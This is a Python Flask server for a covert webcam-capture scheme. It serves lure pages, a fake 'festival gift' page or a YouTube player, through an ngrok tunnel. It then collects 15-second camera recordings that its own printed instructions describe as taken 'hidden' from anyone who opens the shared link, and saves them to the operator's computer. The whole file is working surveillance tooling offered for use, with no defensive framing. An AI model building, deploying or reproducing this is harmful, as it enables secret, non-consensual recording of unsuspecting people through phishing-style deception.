#!/usr/bin/env python3
"""
Gift Video Receiver Server - Dual Mode
YouTube mode: Just shows video with hidden camera
Festival mode: Gift page with festival name
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'gift_videos'
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_videos = []

@app.route('/festival')
def festival_page():
    """Serve the festival HTML page"""
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    """Serve the YouTube HTML page"""
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_video():
    """Receive and save the uploaded video"""
    try:
        if 'video' not in request.files:
            return jsonify({'error': 'No video file'}), 400
        
        video_file = request.files['video']
        if video_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"video_{timestamp}.webm"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        video_file.save(filepath)
        
        video_info = {
            'filename': filename,
            'path': filepath,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath)
        }
        received_videos.append(video_info)
        
        print(f"\n📹 Received video {len(received_videos)}")
        print(f"   📁 {filename}")
        print(f"   📊 {video_info['size']:,} bytes")
        
        # Auto-open the video
        try:
            if sys.platform == 'linux':
                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif sys.platform == 'darwin':
                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        return jsonify({'success': True, 'filename': filename}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/videos', methods=['GET'])
def list_videos():
    return jsonify({'videos': received_videos})

@app.route('/download/<filename>', methods=['GET'])
def download_video(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Server Class
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def check_html_files(self):
        """Check if HTML files exist"""
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def show_menu(self):
        """Show terminal menu and get user choice"""
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        """Get festival/gift name from user"""
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        """Get YouTube video ID from user"""
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        # Extract video ID if URL is provided
        if video and ('youtube.com' in video or 'youtu.be' in video):
            import re
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"  # Rick Astley - Never Gonna Give You Up
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def generate_link(self, mode, name=None, video_id=None):
        """Generate the appropriate link based on mode"""
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_videos(self):
        print("\n🎁 Waiting for videos... (Press Ctrl+C to stop)")
        print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
        print("-"*50)
        print("\n⏳ Waiting for first video...")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_videos)
                
                if current_count > last_count:
                    print(f"\n📹 Received video {current_count}")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next video...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Show menu and get choice
            mode = self.show_menu()
            
            # Get details based on mode
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
                mode_display = "🎊 Festival Mode"
            else:
                video_id = self.get_youtube_video()
                name = None
                mode_display = "🎬 YouTube Mode"
            
            # Start server
            self.start_flask()
            if not self.start_ngrok():
                return
            
            # Generate link
            link, mode_name = self.generate_link(mode, name, video_id)
            
            # Display the link
            print("\n" + "="*60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("="*60)
            print(f"\n🔗 {link}")
            print("\n" + "="*60)
            
            if mode == 'festival':
                print("\n📋 Instructions:")
                print("   1. Send the link above to anyone")
                print("   2. They see a festival/gift page")
                print("   3. They click 'Open Your Gift'")
                print("   4. They grant camera permission")
                print("   5. 15-second video auto-records (hidden)")
                print("   6. Video saves to your computer!")
                print(f"\n🎊 Festival Name: {name}")
            else:
                print("\n📋 Instructions:")
                print("   1. Send the link above to anyone")
                print("   2. They see a YouTube video playing")
                print("   3. Camera records automatically (hidden)")
                print("   4. 15-second video auto-records")
                print("   5. Video saves to your computer!")
                print(f"\n🎬 YouTube Video ID: {video_id}")
            
            print("="*60)
            print("\n📋 Link printed above - copy it manually")
            print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
            
            self.wait_for_videos()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()